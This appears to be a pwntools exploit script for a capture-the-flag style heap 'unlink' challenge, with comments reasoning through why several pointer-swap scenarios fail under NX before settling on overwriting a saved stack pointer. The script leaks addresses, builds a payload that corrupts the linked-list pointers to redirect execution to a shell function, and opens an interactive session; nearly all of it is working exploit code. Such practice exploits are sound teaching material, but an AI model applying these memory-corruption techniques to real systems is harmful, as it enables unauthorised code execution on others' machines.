from pwn import *

p = process('./unlink')

# Uncomment to debug this
#p = gdb.debug('./unlink')

p.recvuntil(': ')
stack = int(p.recvuntil('\n',drop=True), 16)
p.recvuntil(': ')
A = int(p.recvuntil('\n',drop=True), 16)
p.recvuntil('\n')

"""
# Heap layout:
    A{16B}
    16B paddig
    B{16B}
    16B padding
    C{16B}

# A,B,C are of type:
    struct node {
        node *next
        node *prev
        char buf[8]
    }

# The unlink does:
    0x8048521 <unlink+29>    mov    dword ptr [eax + 4], edx
    0x8048524 <unlink+32>    mov    eax, dword ptr [ebp - 4]
    0x8048527 <unlink+35>    mov    edx, dword ptr [ebp - 8]
    0x804852a <unlink+38>    mov    dword ptr [eax], edx

# Which is a equivalent of:
    eax     = C
    edx     = A
    ebp-4   = A
    ebp-8   = C

# Let's assume `ret_addr` is where saved eip is stored
# and `shell` is func we want to execute (RX memory)

# Let's see some scenarios

# Scenario 1: A=shell, C=ret_addr

So:
    eax=ret_addr, edx=shell
    ebp-4=shell, ebp-8=ret_addr
Let's execute unlink code:
    mov [eax+4], edx        ==> *(int*)(ret_addr+4) = shell
    mov eax, [ebp-4]        ==> eax = shell
    mov edx, [ebp-8]        ==> edx = ret_addr
    mov [eax], edx          ==> *(shell) = ret_addr <-- CRASH

Okay, this is entirely wrong as we didn't change ret_addr.
If we set C as ret_addr-4 we would change ret_addr to shell,
but the program would segfault bcoz shell is not writable.
...and we would change shell, oh.

# Scenario 2: A=ret_addr, C=shell
Here we would change ret_addr to shell
and shell+4 to ret_addr.

This is again bad, as shell+4 is not writable...

# Scenario 3: swap ret addr with address on the heap that we control and put a shellcode there

We can't do that bcoz the binary has NX protection/mitigation.

# Scennario 4: be smart, swap something from where the saved eip is fetched later on

Returning from a function usually requires some stack unwinding and itis here too.

"""

# Some addresses, not all of them are used
A_buf       = A + 8
B           = A + 32
C           = B + 32

ret_addr    = stack + 0x28
saved_esp   = stack + 0x10

shell_addr  = 0x080484EB

print("Saved eip addr: 0x%x" % ret_addr)
print("Saved ebp addr: 0x%x" % saved_esp)

# A+8
payload = p32(shell_addr) + p32(stack+100)
payload += 'A'*16

# B
payload += p32(A_buf+4)
payload += p32(saved_esp)

# B->buf or B+8
# The rest of the payload is redundant,
# it was there just for debugging (to control everything)
payload += 'b'*8
payload += 'B'*16

# C
payload += 'C'*32

p.sendline(payload)

p.interactive()
